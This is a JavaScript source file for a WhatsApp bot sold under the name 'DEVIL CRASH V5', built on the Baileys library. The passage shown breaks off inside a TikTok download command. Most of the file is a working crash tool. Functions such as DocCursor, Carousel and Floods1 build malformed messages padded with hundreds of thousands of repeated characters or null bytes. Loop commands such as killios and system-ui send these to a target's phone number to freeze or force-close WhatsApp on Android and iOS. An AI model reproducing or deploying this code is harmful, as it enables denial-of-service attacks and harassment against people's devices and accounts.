// Shared Free By @DEVIL

/*

Dont edit and shell

*/
require('../settings')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const jsobfus = require('javascript-obfuscator');
const { JSDOM } = require('jsdom')
module.exports = Lubzy = async (Lubzy, m, chatUpdate, store) => {
const { from } = m
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await Lubzy.decodeJid(Lubzy.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Lubzy.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const { tiktok } = require('../system/tiktok')
const reply = m.reply
//===================================
if (!Lubzy.public) {
if (!isCreator) return
}
//===================================
if (command) {
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`「 SYSTEM 」`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}
//===================================
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
Lubzy.sendPresenceUpdate(jd, from)
}
//===================================
async function loading () {
var Vzloading = [
"",
"",
""
]
let { key } = await Lubzy.sendMessage(from, {text: " "})
for (let i = 0; i < Vzloading.length; i++) {
await Lubzy.sendMessage(from, {text: Vzloading[i], edit: key });
}
}
//===================================
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}
//===================================
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
//===================================
async function MSGSPAM(Pe) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: Pe,
              },
            },
            body: {
              text: "༿༑ᜳ𝗗͢𝗘𝗩͜𝗜̸𝗟͠͠͠𝗖𝗥𝗔𝗦𝗛ᢶ⃟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Lubzy.relayMessage(Pe, Msg, {
      participant: { jid: Pe },
    })
  }
  async function NativeC(Pe) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: Pe,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "DEVILCRASHV5͢-" + "᭄".repeat(9741),
            description: "💌",
            footer: "DEVIL",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await Lubzy.relayMessage(Pe, NativeCore, {
    participant: { jid: Pe },
  });
  console.log("Success! Crash Button Sent")
}
async function DocCursor(Pe) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "DEVILCRASV5⃟" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: Lubzy.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [Pe, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "༿༑ᜳ𝗗͢𝗘𝗩͜𝗜̸𝗟͠͠͠𝗖𝗥𝗔𝗦𝗛ᢶ⃟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© T-Яyuichi",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "⩟⬦𪲁𝗗𝗘𝗩𝗜𝗟̷̷̷𝗖𝗥𝗔𝗦𝗛 -"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: null,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/tamainfinity",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: Pe,
initiatedByMe:true
},
groupSubject: "crash",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 T-Riyu ~ \"ryc\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© T-Яyuichi",
thumbnail: null,
sourceUrl: "se me?",
sourceId: "ryc ~ broken",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await Lubzy.relayMessage(Pe, messagePayload, {
additionalNodes: stanza,
participant: { jid : Pe }
});
console.log("Success! Force Ui Sent")
}
async function Carousel(Pe) {
    const msg = generateWAMessageFromContent(
        Pe,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://ibb.co/SwXCGwBS" } }, 
                                            { upload: Lubzy.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `bang itu cara buat run bot gimana?` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂۞𝐓͢𝐚𝐦𝐚ܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟😂",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@tamainfinity\",\"merchant_url\":\"https://www.youtube.com/@tamainfinity\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: m }
    );
    await Lubzy.relayMessage(Pe, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}
async function Floods1(Pe) {
            Lubzy.relayMessage(Pe, {
             groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Hello I am DEVIL" + "ꦾ".repeat(120000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "TAMAXSENTRY" }]
                        }
                    }
                }
            }
        }, { participant: { jid: Pe } }, { messageId: null });
        console.log(" Bug Sending : Floods ")
}
Lubzy.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Lubzy.sendPresenceUpdate('composing', jid)
      return Lubzy.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
//===================================
const { PayLoad, Sletter, Sletter2, payios, payios2 } = require("../system/database/exports")
const { Fchat, Trash, TrashIos, FcChat2, Dox, IosC } = require("../system/database/module")
async function KillIos(Pe)  {
for (let i = 0; i < 50; i++) {
await IosC(Lubzy, Pe)
await TrashIos(Lubzy, Pe)
await IosC(Lubzy, Pe)
await payios2(Lubzy, Pe)
await payios(Lubzy, Pe)
await TrashIos(Lubzy, Pe)
await IosC(Lubzy, Pe)
}
console.log(" Bug Ios Sending ")
}
async function CrashGroup(Pe) {
for (let i = 0; i < 10; i++) {
await Fchat(Lubzy, Pe)
await Floods1(Pe)
await FcChat2(Lubzy, Pe)
await Fchat(Lubzy, Pe)
await FcChat2(Lubzy, Pe)
}
console.log(" Bug Group Sending ")
}

async function HitBeta(Pe) {
for (let i = 0; i < 25; i++) {
await Dox(Lubzy, Pe)
await PayLoad(Lubzy, Pe)
await Dox(Lubzy, Pe)
await Trash(Lubzy, Pe)
await Fchat(Lubzy, Pe)
await Trash(Lubzy, Pe)
await FcChat2(Lubzy, Pe)
await Dox(Lubzy, Pe)
}
console.log(" Bug Android Sending ")
}
const resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

Lubzy.ments = async (text) => {
    return [m.sender];
};
const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Options' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Options",
                    sections: [
                        {
                            title: "Select This Options",
                            highlight_label: "",
                            rows: [
                                {
                                    header: "Bug Feature",
                                    title: "",
                                    description: "",
                                    id: ".bugmenu"
                                },
                                {
                                    header: "Owner Feature",
                                    title: "",
                                    description: "",
                                    id: ".ownermenu"
                                },
                                {
                                    header: "Group Feature",
                                    title: "",
                                    description: "",
                                    id: ".groupmenu"
                                },
                                {
                                    header: "Other Feature",
                                    title: "",
                                    description: "",
                                    id: ".othermenu"
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

//===================================
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

switch(command) {
case 'menu': {
let MenuNiBos = `
\`DEVIL CRASH V5\`
┏━━━━━━━━━━━━━━━━━━━❍
┃ ϟ D𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : DEVIL CRASH OFFICIAL
┃ ϟ 𝖵𝖾𝗋𝗌𝗂 : 5.0.0
┃ ϟ 𝖳𝗒𝗉𝖾 : CRASH
┃ ϟ Runtime : ${runtime(process.uptime())}
┃ ⚠️ ɴᴇᴡ ғᴇᴀᴛᴜʀ : Bug x Cpanel
┗━━━━━━━━━━━━━━━━━━━❍

\`DEVIL CRASH V5\`
┏━━━━━━━━━━━━━━━━━━━❍
┃ ϟ ʙᴜɢᴍᴇɴᴜ : {Command attack bug}
┃ ϟ ᴏᴡɴᴇʀᴍᴇɴᴜ : {Command acces}
┃ ϟ ɢʀᴏᴜᴘᴍᴇɴᴜ : {Command Group}
┃ ϟ ᴏᴛʜᴇʀᴍᴇɴᴜ : {Command Tools}
┗━━━━━━━━━━━━━━━━━━━❍
`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: MenuNiBos,
     footer: "Shared Free By DEVIL",
     buttons: [ 
         { buttonId: `.owner`,
          buttonText: {
          displayText: 'CONNACT DEVIL' 
          }, type: 1 },
         { buttonId: `.bugmenu`,
          buttonText: {
          displayText: 'DEVIL BUG'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
}
break
//===================================
case 'bugmenu': {
let BugMenu = `
\`BUGMENU\`
┏━━━━━━━━━━━━━━━━━━━❍
┃  ✦ DEVIL CRASH V5 ✦
┃  ❖ sʏsᴛᴇᴍ-ᴜɪ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /system-ui 91xxx
┃ └⊱ Condemning Forclose WhatsApp Chat
┃
┃  ❖ ᴜɪ-ғʀᴇᴇᴢᴇ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /ui-freeze 91xxx
┃ └⊱ Condemning Crash Beta
┃
┃  ❖ ғᴏʀᴄᴇ-sʏsᴛᴇᴍ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /Force-system ╸91xxx
┃ └⊱ Condemning Force WhatsApp Chat
┃
┃  ❖ ᴋɪʟʟɪᴏs
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /killios 91xxx
┃ └⊱ Condemning Crash Home
┃
┃  ❖ ᴅᴇᴠɪʟᴄʀᴀsʜᴠ5
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /devilcrashv5 91xxx
┃ └⊱ Condemning Phone Spam
┗━━━━━━━━━━━━━━━━━━━❍
`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: BugMenu,
     footer: "DEVIL CRASH V5 - DEVIL CRASH OFFICIAL",
     buttons: [ 
         { buttonId: `.ownermenu`,
          buttonText: {
          displayText: 'OWNER MENU' 
          }, type: 1 },
         { buttonId: `.menu`,
          buttonText: {
          displayText: 'BACK TO MENU'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
}
break
//===================================
case 'ownermenu': {
let OwnMenu = `
\`DEVIL CRASH V5\`
┏━━━━━━━━━━━━━━━━━━━❍
┃❖ ᴀᴅᴅᴏᴡɴ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /addown 91xxx
┃ └⊱ Condemning Owner Bot
┃
┃ ❖ ᴅᴇʟᴏᴡɴ
┃ └⊱ Example: /delown 91xxx
┃ └⊱ Condemning delete owner Bot
┃
┃ ❖ ᴀᴅᴅᴘʀᴇᴍ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /addprem ╸91xxx
┃ └⊱ Condemning premium bot
┃
┃ ❖ ᴅᴇʟᴘʀᴇᴍ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /delprem 91xxx
┃ └⊱ Condemning  delete premium bot
┃
┃ ❖ ᴘᴜʙʟɪᴄ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /public 91xxx
┃ └⊱ Condemning public bot
┃
┃ ❖ sᴇʟғ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /self 91xxx
┃ └⊱ Condemning self bot
┗━━━━━━━━━━━━━━━━━━━❍
`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: OwnMenu,
     footer: "DEVIL CRASH V5 - DEVIL CRASH OFFICIAL",
     buttons: [ 
         { buttonId: `.owner`,
          buttonText: {
          displayText: '𝗕𝗨𝗬 𝗦𝗖𝗥𝗜𝗣𝗧 𝗩𝗩𝗜𝗣' 
          }, type: 1 },
         { buttonId: `.groupmenu`,
          buttonText: {
          displayText: 'DEVIL GROUP'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
    }
break
//===================================
case 'groupmenu': {
let GMenu = `
\`DEVIL CRASH V5\`
┏━━━━━━━━━━━━━━━━━━━❍
┃❖ ᴋɪᴄᴋ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /kick 91xxx
┃ └⊱ Condemning Kick member to Group
┃
┃ ❖ ʜɪᴅᴇᴛᴀɢ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /hidetag *in group*
┃ └⊱ Condemning tag all mem group
┃
┃ ❖ ᴛᴏᴛᴀɢ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /totag *in group*
┃ └⊱ Condemning tag admin
┃
┃ ❖ ʟɪɴᴋɢᴄ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /linkgc *in group*
┃ └⊱ Condemning  add link group
┃
┃ ❖ ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /resetlinkgc *in group*
┃ └⊱ Condemning reset  link gorup
┗━━━━━━━━━━━━━━━━━━━❍
`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: GMenu,
     footer: "DEVIL CRASH V5 - DEVIL CRASH OFFICIAL",
     buttons: [ 
         { buttonId: `.bugmenu`,
          buttonText: {
          displayText: 'DEVIL BUG' 
          }, type: 1 },
         { buttonId: `.othermenu`,
          buttonText: {
          displayText: 'DEVIL OTHER҉'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
}
break
//==================================
case 'othermenu': {
let OtherMenu = `
\`DEVIL CRASH V5\`
┏━━━━━━━━━━━━━━━━━━━❍
┃❖ sᴛɪᴄᴋᴇʀ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /sticker *Image*
┃ └⊱ Condemning creted sticker
┃
┃ ❖ ᴛɪᴋᴛᴏᴋ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /tiktok *url*
┃ └⊱ Condemning download tiktok
┃
┃ ❖ ʀᴠᴏ
┃ └⊱ ᴇxᴀᴍᴘʟᴇ: /rvo ╸Reply Image
┃ └⊱ Condemning replace image 1x
┗━━━━━━━━━━━━━━━━━━━❍
`
await Lubzy.sendMessage(m.key.remoteJid, {
     image: { url: global.fotonjr },
     caption: OtherMenu,
     footer: "DEVIL CRASH V5 - DEVIL CRASH OFFICIAL",
     buttons: [ 
         { buttonId: `.owner`,
          buttonText: {
          displayText: 'O҉W҉N҉E҉R҉ ҉G҉A҉N҉T҉E҉N҉G҉🥰' 
          }, type: 1 },
         { buttonId: `.tqto`,
          buttonText: {
          displayText: '𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: m })
}
break
//==================================
case 'addowner': case 'addown':
if (!isCreator) return m.reply("only owner access")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Example ${prefix+command} 91xxx`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Lubzy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Number Invalid!!!`)
owner.push(bnnd)
Premium.push(bnnd)
fs.writeFileSync('./system/owner.json', JSON.stringify(owner))
fs.writeFileSync('./system/premium.json', JSON.stringify(Premium))
m.reply("success")
break
//===================================
case 'delowner': case 'delown':
if (!isCreator) return m.reply("only owner access")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Example:\n ${prefix+command} 91xxx`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = Premium.indexOf(yaki)
owner.splice(unp, 1)
Premium.splice(anp, 1)
fs.writeFileSync('./system/owner.json', JSON.stringify(owner))
fs.writeFileSync('./system/premium.json', JSON.stringify(Premium))
m.reply("success")
break
//===================================
case 'addpremium': case 'addprem':
if (!isCreator) return m.reply("only owner access")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Example ${prefix+command} 91xxx`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await Lubzy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return m.reply(`Number  Invalid!!!`)
Premium.push(bnnd)
fs.writeFileSync('./system/premium.json', JSON.stringify(Premium))
m.reply("success")
break
//===================================
case 'delpremium': case 'delprem':
if (!isCreator) return m.reply("only owner access")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Example ${prefix+command} 91xxx`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = Premium.indexOf(yaki)
Premium.splice(unp, 1)
fs.writeFileSync('./system/premium.json', JSON.stringify(Premium))
m.reply("success")
break
//===================================
case'tiktok':
      case'tt':{
        if (!qtext) return reply(`mana link tiktok nya? contoh ${prefix + command} https://`);
         let res = await tiktok(qtext);
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await Lubzy.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
